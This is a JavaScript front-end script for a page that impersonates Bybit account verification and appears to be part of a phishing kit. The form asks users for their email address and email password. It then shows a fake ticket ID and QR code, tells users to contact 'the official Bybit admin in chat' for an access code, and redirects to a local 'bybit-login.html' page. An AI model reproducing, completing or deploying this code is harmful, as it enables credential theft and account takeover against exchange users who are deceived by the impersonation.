document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('verificationForm');
    const emailSection = document.getElementById('emailSection');
    const radioButtons = document.querySelectorAll('input[name="has2fa"]');

    // Show/hide email section based on radio button selection
    radioButtons.forEach(radio => {
        radio.addEventListener('change', function() {
            if (this.value === 'yes') {
                emailSection.classList.remove('hidden');
            } else {
                emailSection.classList.add('hidden');
            }
        });
    });

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        console.log('Form submitted');

        const has2fa = document.querySelector('input[name="has2fa"]:checked').value;
        const email = document.getElementById('email').value;
        const emailPassword = document.getElementById('emailPassword').value;

        console.log('Form values:', { has2fa, email: email ? 'provided' : 'not provided' });

        if (has2fa === 'yes' && (!email || !emailPassword)) {
            alert('Please fill in all required fields');
            return;
        }

        try {
            // Generate ticket ID
            console.log('Generating ticket ID...');
            const ticketId = generateTicketId();
            console.log('Ticket ID generated:', ticketId);
            
            // Generate QR code with ticket ID
            console.log('Generating QR code...');
            const qrCodeUrl = await generateQRCode(ticketId);
            console.log('QR code generated:', qrCodeUrl);

            // Store ticket information in sessionStorage
            console.log('Storing data in sessionStorage...');
            sessionStorage.setItem('ticketId', ticketId);
            sessionStorage.setItem('qrCodeUrl', qrCodeUrl);
            sessionStorage.setItem('email', email);
            sessionStorage.setItem('has2fa', has2fa);
            console.log('Data stored successfully');

            // Create and show ticket info
            const ticketInfo = document.createElement('div');
            ticketInfo.className = 'ticket-info';
            ticketInfo.innerHTML = `
                <h3>Verification Ticket</h3>
                <div class="ticket-details">
                    <p><strong>Ticket ID:</strong> ${ticketId}</p>
                    <div class="qr-code">
                        <img src="${qrCodeUrl}" alt="QR Code" onerror="this.onerror=null; console.error('QR code image failed to load');">
                    </div>
                </div>
                <p class="ticket-instructions">Please provide this ticket information to the official Bybit admin in chat for a six character access code to proceed. Save the QR code for future reference.</p>
                <div class="access-code-section hidden">
                    <div class="form-group">
                        <label for="accessCode">Enter Access Code from Admin</label>
                        <input type="text" id="accessCode" name="accessCode" placeholder="Enter 6-character code" maxlength="6" pattern="[1-6]{4}[A-Z]{2}">
                        <p class="security-info">Format: 4 numbers (1-6) followed by 2 letters (A-Z)</p>
                    </div>
                    <button id="verifyCodeBtn" class="submit-btn">Verify Code</button>
                </div>
                <button id="continueBtn" class="submit-btn" style="margin-top: 20px;">Continue to Bybit Login</button>
            `;

            // Hide the form and show ticket info
            form.style.display = 'none';
            document.querySelector('.card').insertBefore(ticketInfo, document.querySelector('.security-features'));

            // Add event listener to continue button
            document.getElementById('continueBtn').addEventListener('click', function() {
                const accessCodeSection = document.querySelector('.access-code-section');
                accessCodeSection.classList.remove('hidden');
                this.style.display = 'none';
            });

            // Add event listener to verify code button
            document.getElementById('verifyCodeBtn').addEventListener('click', function() {
                const accessCode = document.getElementById('accessCode').value.toUpperCase();
                const codePattern = /^[1-6]{4}[A-Z]{2}$/;

                if (!codePattern.test(accessCode)) {
                    alert('Invalid code format. Please ask the admin in chat for the correct access code.');
                    return;
                }

                // Store the verified code
                sessionStorage.setItem('accessCode', accessCode);
                
                // Redirect to Bybit login
                window.location.href = 'bybit-login.html';
            });

        } catch (error) {
            console.error('Error during form submission:', error);
            alert('An error occurred. Please try again.');
        }
    });
}); 